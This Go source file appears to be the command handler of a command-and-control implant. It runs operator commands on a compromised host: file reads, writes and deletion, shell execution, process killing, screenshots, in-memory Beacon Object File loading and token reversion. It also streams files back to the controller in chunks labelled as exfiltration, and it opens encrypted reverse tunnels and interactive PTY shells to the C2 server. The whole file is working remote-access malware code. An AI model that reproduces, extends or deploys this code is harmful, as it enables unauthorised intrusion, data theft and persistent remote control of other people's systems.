package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/vmihailenco/msgpack/v5"
	"gopher/bof/coffer"
	"gopher/functions"
	"gopher/utils"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"sync"
	"syscall"
	"time"
)

var UPLOADS map[string][]byte
var DOWNLOADS map[string]utils.Connection
var JOBS map[string]utils.Connection
var TUNNELS sync.Map
var TERMINALS sync.Map

func TaskProcess(commands [][]byte) [][]byte {
	var (
		command utils.Command
		data    []byte
		result  [][]byte
		err     error
	)

	for _, cmdBytes := range commands {
		err = msgpack.Unmarshal(cmdBytes, &command)
		if err != nil {
			continue
		}

		switch command.Code {

		case utils.COMMAND_DOWNLOAD:
			data, err = jobDownloadStart(command.Data)

		case utils.COMMAND_CAT:
			data, err = taskCat(command.Data)

		case utils.COMMAND_CD:
			data, err = taskCd(command.Data)

		case utils.COMMAND_CP:
			data, err = taskCp(command.Data)

		case utils.COMMAND_EXEC_BOF:
			data, err = taskExecBof(command.Data)

		case utils.COMMAND_EXIT:
			data, err = taskExit()

		case utils.COMMAND_JOB_LIST:
			data, err = taskJobList()

		case utils.COMMAND_JOB_KILL:
			data, err = taskJobKill(command.Data)

		case utils.COMMAND_KILL:
			data, err = taskKill(command.Data)

		case utils.COMMAND_LS:
			data, err = taskLs(command.Data)

		case utils.COMMAND_MKDIR:
			data, err = taskMkdir(command.Data)

		case utils.COMMAND_MV:
			data, err = taskMv(command.Data)

		case utils.COMMAND_PS:
			data, err = taskPs()

		case utils.COMMAND_PWD:
			data, err = taskPwd()

		case utils.COMMAND_REV2SELF:
			data, err = taskRev2Self()

		case utils.COMMAND_RM:
			data, err = taskRm(command.Data)

		case utils.COMMAND_RUN:
			data, err = jobRun(command.Data)

		case utils.COMMAND_SHELL:
			data, err = taskShell(command.Data)

		case utils.COMMAND_SCREENSHOT:
			data, err = taskScreenshot()

		case utils.COMMAND_TERMINAL_START:
			jobTerminal(command.Data)

		case utils.COMMAND_TERMINAL_STOP:
			taskTerminalKill(command.Data)

		case utils.COMMAND_TUNNEL_START:
			jobTunnel(command.Data)

		case utils.COMMAND_TUNNEL_STOP:
			taskTunnelKill(command.Data)

		case utils.COMMAND_UPLOAD:
			data, err = taskUpload(command.Data)

		case utils.COMMAND_ZIP:
			data, err = taskZip(command.Data)

		default:
			continue
		}

		if err != nil {
			command.Code = utils.COMMAND_ERROR
			command.Data, _ = msgpack.Marshal(utils.AnsError{Error: err.Error()})
		} else {
			command.Data = data
		}

		packerData, _ := msgpack.Marshal(command)
		result = append(result, packerData)
	}

	return result
}

/// TASKS

func taskCat(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCat
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	content, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsCat{Path: params.Path, Content: content})
}

func taskCd(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCd
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	err = os.Chdir(path)
	if err != nil {
		return nil, err
	}

	newPath, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: newPath})
}

func taskCp(paramsData []byte) ([]byte, error) {
	var params utils.ParamsCp
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
	}

	return nil, err
}

func taskExecBof(paramsData []byte) ([]byte, error) {
	var params utils.ParamsExecBof
	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
		return nil, err
	}

	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
	if err != nil {
		args = make([]byte, 1)
	}

	out, err := coffer.Load(params.Object, args)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsExecBof{Output: out})
}

func taskExit() ([]byte, error) {
	ACTIVE = false
	return nil, nil
}

func taskJobList() ([]byte, error) {

	var jobList []utils.JobInfo
	for k, v := range DOWNLOADS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}
	for k, v := range JOBS {
		jobList = append(jobList, utils.JobInfo{JobId: k, JobType: v.PackType})
	}

	list, _ := msgpack.Marshal(jobList)

	return msgpack.Marshal(utils.AnsJobList{List: list})
}

func taskJobKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsJobKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	job, ok := DOWNLOADS[params.Id]
	if !ok {
		job, ok = JOBS[params.Id]
		if !ok {
			return nil, fmt.Errorf("job '%s' not found", params.Id)
		}
	}

	if job.JobCancel != nil {
		job.JobCancel()
	}

	job.HandleCancel()

	return nil, nil
}

func taskKill(paramsData []byte) ([]byte, error) {
	var params utils.ParamsKill
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	proc, err := os.FindProcess(params.Pid)
	if err != nil {
		return nil, err
	}

	err = proc.Signal(syscall.SIGKILL)
	return nil, err
}

func taskLs(paramsData []byte) ([]byte, error) {
	var params utils.ParamsLs
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	Files, err := functions.GetListing(path)
	if err != nil {
		return msgpack.Marshal(utils.AnsLs{Result: false, Status: err.Error(), Path: path, Files: nil})
	}

	filesData, _ := msgpack.Marshal(Files)

	return msgpack.Marshal(utils.AnsLs{Result: true, Path: path, Files: filesData})
}

func taskMkdir(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMkdir
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	mode := os.FileMode(0755)
	err = os.MkdirAll(path, mode)

	return nil, err
}

func taskMv(paramsData []byte) ([]byte, error) {
	var params utils.ParamsMv
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	err = os.Rename(srcPath, dstPath)
	if err == nil {
		return nil, nil
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	if info.IsDir() {
		err = functions.CopyDir(srcPath, dstPath)
		if err == nil {
			_ = os.RemoveAll(srcPath)
		}
	} else {
		err = functions.CopyFile(srcPath, dstPath, info)
		if err == nil {
			_ = os.Remove(srcPath)
		}
	}
	return nil, err
}

func taskPs() ([]byte, error) {
	Processes, err := functions.GetProcesses()
	if err != nil {
		return nil, err
	}

	processesData, _ := msgpack.Marshal(Processes)

	return msgpack.Marshal(utils.AnsPs{Result: true, Processes: processesData})
}

func taskPwd() ([]byte, error) {
	path, err := os.Getwd()
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsPwd{Path: path})
}

func taskRev2Self() ([]byte, error) {
	functions.Rev2Self()
	return nil, nil
}

func taskRm(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRm
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	if info.IsDir() {
		err = os.RemoveAll(path)
	} else {
		err = os.Remove(path)
	}
	return nil, err
}

func taskScreenshot() ([]byte, error) {
	screenshot, err := functions.Screenshots()
	if err != nil {
		return nil, err
	}

	screens := make([][]byte, 0)
	for _, pic := range screenshot {
		screens = append(screens, pic)
	}

	return msgpack.Marshal(utils.AnsScreenshots{Screens: screens})
}

func taskShell(paramsData []byte) ([]byte, error) {
	var params utils.ParamsShell
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	cmd := exec.Command(params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	output, _ := cmd.CombinedOutput()

	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
}

func taskTerminalKill(paramsData []byte) {
	var params utils.ParamsTerminalStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TERMINALS.Load(params.TermId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskTunnelKill(paramsData []byte) {
	var params utils.ParamsTunnelStop
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	value, ok := TUNNELS.Load(params.ChannelId)
	if ok {
		cancel, ok := value.(context.CancelFunc)
		if ok {
			cancel()
		}
	}
}

func taskUpload(paramsData []byte) ([]byte, error) {
	var params utils.ParamsUpload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	uploadBytes, ok := UPLOADS[path]
	if !ok {
		uploadBytes = params.Content
	} else {
		delete(UPLOADS, path)
		uploadBytes = append(uploadBytes, params.Content...)
	}

	if params.Finish {
		files, err := functions.UnzipBytes(uploadBytes)
		if err != nil {
			return nil, err
		}

		content, ok := files[params.Path]
		if !ok {
			return nil, errors.New("file not uploaded")
		}

		err = os.WriteFile(path, content, 0644)
		if err != nil {
			return nil, err
		}

	} else {
		UPLOADS[path] = uploadBytes
		return nil, nil
	}

	return msgpack.Marshal(utils.AnsUpload{Path: path})
}

func taskZip(paramsData []byte) ([]byte, error) {
	var params utils.ParamsZip
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	srcPath, err := functions.NormalizePath(params.Src)
	if err != nil {
		return nil, err
	}
	dstPath, err := functions.NormalizePath(params.Dst)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		return nil, err
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(srcPath)
	} else {
		content, err = functions.ZipFile(srcPath)
	}
	if err != nil {
		return nil, err
	}

	err = os.WriteFile(dstPath, content, 0644)
	if err != nil {
		return nil, err
	}

	return msgpack.Marshal(utils.AnsZip{Path: dstPath})
}

/// JOBS

func jobDownloadStart(paramsData []byte) ([]byte, error) {
	var params utils.ParamsDownload
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	path, err := functions.NormalizePath(params.Path)
	if err != nil {
		return nil, err
	}

	info, err := os.Stat(path)
	if err != nil {
		return nil, err
	}

	size := info.Size() // тип int64

	if size > 4*1024*1024*1024 {
		return nil, errors.New("file too big (>4GB)")
	}

	var content []byte
	if info.IsDir() {
		content, err = functions.ZipDirectory(path)
		path += ".zip"
	} else {
		content, err = os.ReadFile(path)
	}
	if err != nil {
		return nil, err
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		return nil, err
	}

	strFileId := params.Task
	FileId, _ := strconv.ParseInt(strFileId, 16, 64)

	connection := utils.Connection{
		PackType: utils.EXFIL_PACK,
		Conn:     conn,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	DOWNLOADS[strFileId] = connection

	go func() {
		defer func() {
			connection.HandleCancel()
			_ = conn.Close()
			delete(DOWNLOADS, strFileId)
		}()

		exfilPack, _ := msgpack.Marshal(utils.ExfilPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		exfilMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.EXFIL_PACK, Data: exfilPack})
		exfilMsg, _ = utils.EncryptData(exfilMsg, encKey)

		job := utils.Job{
			CommandId: utils.COMMAND_DOWNLOAD,
			JobId:     params.Task,
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, exfilMsg)

		chunkSize := 0x100000 // 1MB
		totalSize := len(content)
		for i := 0; i < totalSize; i += chunkSize {

			end := i + chunkSize
			if end > totalSize {
				end = totalSize
			}
			start := i == 0
			finish := end == totalSize

			canceled := false

			select {
			case <-connection.Ctx.Done():
				finish = true
				canceled = true
			default:
				// Continue
			}

			job.Data, _ = msgpack.Marshal(utils.AnsDownload{FileId: int(FileId), Path: path, Content: content[i:end], Size: len(content), Start: start, Finish: finish, Canceled: canceled})
			packedJob, _ := msgpack.Marshal(job)

			message := utils.Message{
				Type:   2,
				Object: [][]byte{packedJob},
			}

			sendData, _ := msgpack.Marshal(message)
			sendData, _ = utils.EncryptData(sendData, utils.SKey)
			_ = functions.SendMsg(conn, sendData)

			if finish {
				break
			}
			time.Sleep(time.Millisecond * 100)
		}
	}()

	return nil, nil
}

func jobRun(paramsData []byte) ([]byte, error) {
	var params utils.ParamsRun
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return nil, err
	}

	procCtx, procCancel := context.WithCancel(context.Background())
	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
	functions.ProcessSettings(cmd)
	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stdout pipe error: %w", err)
	}
	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("stderr pipe error: %w", err)
	}

	var stdoutMu sync.Mutex
	var stderrMu sync.Mutex
	stdoutBuf := new(bytes.Buffer)
	stderrBuf := new(bytes.Buffer)
	stdoutScanner := bufio.NewScanner(stdoutPipe)
	stderrScanner := bufio.NewScanner(stderrPipe)

	err = cmd.Start()
	if err != nil {
		procCancel()
		return nil, fmt.Errorf("start error: %w", err)
	}
	pid := 0
	if cmd.Process != nil {
		pid = cmd.Process.Pid
	}

	var conn net.Conn
	if profile.UseSSL {
		cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
		if certerr != nil {
			procCancel()
			return nil, err
		}

		caCertPool := x509.NewCertPool()
		caCertPool.AppendCertsFromPEM(profile.CaCert)

		config := &tls.Config{
			Certificates:       []tls.Certificate{cert},
			RootCAs:            caCertPool,
			InsecureSkipVerify: true,
		}
		conn, err = tls.Dial("tcp", profile.Addresses[0], config)

	} else {
		conn, err = net.Dial("tcp", profile.Addresses[0])
	}
	if err != nil {
		procCancel()
		return nil, err
	}

	connection := utils.Connection{
		PackType:  utils.JOB_PACK,
		Conn:      conn,
		JobCancel: procCancel,
	}
	connection.Ctx, connection.HandleCancel = context.WithCancel(context.Background())
	JOBS[params.Task] = connection

	go func() {
		defer func() {
			procCancel()
			connection.HandleCancel()
			_ = conn.Close()
			delete(JOBS, params.Task)
		}()

		jobPack, _ := msgpack.Marshal(utils.JobPack{Id: uint(AgentId), Type: profile.Type, Task: params.Task})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_PACK, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				return
			}
		}

		/// Send Init
		functions.SendMsg(conn, jobMsg)

		job := utils.Job{
			CommandId: utils.COMMAND_RUN,
			JobId:     params.Task,
		}

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Start: true})
		packedJob, _ := msgpack.Marshal(job)

		message := utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ := msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			for stdoutScanner.Scan() {
				stdoutMu.Lock()
				stdoutBuf.WriteString(stdoutScanner.Text() + "\n")
				stdoutMu.Unlock()
			}
		}()
		go func() {
			defer wg.Done()
			for stderrScanner.Scan() {
				stderrMu.Lock()
				stderrBuf.WriteString(stderrScanner.Text() + "\n")
				stderrMu.Unlock()
			}
		}()

		done := make(chan struct{})
		var lastOutLen, lastErrLen int
		go func() {
			ticker := time.NewTicker(5 * time.Second)
			defer ticker.Stop()
			for {
				select {
				case <-done:
					return
				case <-ticker.C:

					ansRun := utils.AnsRun{Pid: pid}

					stdoutMu.Lock()
					out := stdoutBuf.String()
					stdoutMu.Unlock()
					if len(out) > lastOutLen {
						ansRun.Stdout = out[lastOutLen:]
						lastOutLen = len(out)
					}

					stderrMu.Lock()
					errOut := stderrBuf.String()
					stderrMu.Unlock()
					if len(errOut) > lastErrLen {
						ansRun.Stderr = errOut[lastErrLen:]
						lastErrLen = len(errOut)
					}

					if len(ansRun.Stdout) > 0 || len(ansRun.Stderr) > 0 {
						job.Data, _ = msgpack.Marshal(ansRun)
						packedJob, _ := msgpack.Marshal(job)

						message := utils.Message{
							Type:   2,
							Object: [][]byte{packedJob},
						}

						sendData, _ := msgpack.Marshal(message)
						sendData, _ = utils.EncryptData(sendData, utils.SKey)
						functions.SendMsg(conn, sendData)
					}
				}
			}
		}()

		time.Sleep(200 * time.Millisecond)
		err = cmd.Wait()
		wg.Wait()
		close(done)

		ansRun := utils.AnsRun{Pid: pid}
		if out := stdoutBuf.String(); len(out) > lastOutLen {
			ansRun.Stdout = out[lastOutLen:]
		}
		if errOut := stderrBuf.String(); len(errOut) > lastErrLen {
			ansRun.Stderr = errOut[lastErrLen:]
		}
		job.Data, _ = msgpack.Marshal(ansRun)
		packedJob, _ = msgpack.Marshal(job)
		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}
		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)

		/// FINISH

		job.Data, _ = msgpack.Marshal(utils.AnsRun{Pid: pid, Finish: true})
		packedJob, _ = msgpack.Marshal(job)

		message = utils.Message{
			Type:   2,
			Object: [][]byte{packedJob},
		}

		sendData, _ = msgpack.Marshal(message)
		sendData, _ = utils.EncryptData(sendData, utils.SKey)
		functions.SendMsg(conn, sendData)
	}()

	return nil, nil
}

func jobTunnel(paramsData []byte) {
	var params utils.ParamsTunnelStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		clientConn, err := net.DialTimeout(params.Proto, params.Address, 200*time.Millisecond)
		if err != nil {
			active = false
		}

		var srvConn net.Conn
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			srvConn.Close()
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TunnelPack{Id: uint(AgentId), Type: profile.Type, ChannelId: params.ChannelId, Key: tunKey, Iv: tunIv, Alive: active})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TUNNEL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				return
			}
		}

		/// Send Init
		functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		encCipher, _ := aes.NewCipher(tunKey)
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, _ := aes.NewCipher(tunKey)
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TUNNELS.Store(params.ChannelId, cancel)
		defer TUNNELS.Delete(params.ChannelId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				_ = clientConn.Close()
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			io.Copy(clientConn, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			io.Copy(streamWriter, clientConn)
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()

		cancel()
	}()
}

func jobTerminal(paramsData []byte) {
	var params utils.ParamsTerminalStart
	err := msgpack.Unmarshal(paramsData, &params)
	if err != nil {
		return
	}

	go func() {
		active := true
		status := ""

		process := exec.Command(params.Program)
		ptyProc, err := functions.StartPtyCommand(process, uint16(params.Width), uint16(params.Height))
		if err != nil {
			active = false
			status = err.Error()
		}

		var srvConn net.Conn
		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			srvConn, err = tls.Dial("tcp", profile.Addresses[0], config)

		} else {
			srvConn, err = net.Dial("tcp", profile.Addresses[0])
		}
		if err != nil {
			if active {
				functions.StopPty(ptyProc)
				_ = process.Process.Kill()
			}
			return
		}

		tunKey := make([]byte, 16)
		_, _ = rand.Read(tunKey)
		tunIv := make([]byte, 16)
		_, _ = rand.Read(tunIv)

		jobPack, _ := msgpack.Marshal(utils.TermPack{Id: uint(AgentId), TermId: params.TermId, Key: tunKey, Iv: tunIv, Alive: active, Status: status})
		jobMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.JOB_TERMINAL, Data: jobPack})
		jobMsg, _ = utils.EncryptData(jobMsg, encKey)

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(srvConn, profile.BannerSize)
			if err != nil {
				srvConn.Close()
				if active {
					functions.StopPty(ptyProc)
					_ = process.Process.Kill()
				}
				return
			}
		}

		/// Send Init
		_ = functions.SendMsg(srvConn, jobMsg)

		if !active {
			srvConn.Close()
			return
		}

		encCipher, _ := aes.NewCipher(tunKey)
		encStream := cipher.NewCTR(encCipher, tunIv)
		streamWriter := &cipher.StreamWriter{S: encStream, W: srvConn}

		decCipher, _ := aes.NewCipher(tunKey)
		decStream := cipher.NewCTR(decCipher, tunIv)
		streamReader := &cipher.StreamReader{S: decStream, R: srvConn}

		ctx, cancel := context.WithCancel(context.Background())
		TERMINALS.Store(params.TermId, cancel)
		defer TERMINALS.Delete(params.TermId)

		var closeOnce sync.Once
		closeAll := func() {
			closeOnce.Do(func() {
				time.Sleep(200 * time.Millisecond)
				_ = functions.StopPty(ptyProc)
				if functions.IsProcessRunning(process) {
					_ = process.Process.Kill()
				}
				_ = srvConn.Close()
			})
		}

		var wg sync.WaitGroup
		wg.Add(2)

		go func() {
			defer wg.Done()
			functions.RelayConnToPty(ptyProc, streamReader)
			closeAll()
		}()

		go func() {
			defer wg.Done()
			functions.RelayPtyToConn(streamWriter, ptyProc)
			closeAll()
		}()

		go func() {
			<-ctx.Done()
			closeAll()
		}()

		wg.Wait()
		_ = process.Wait()

		cancel()
	}()
}
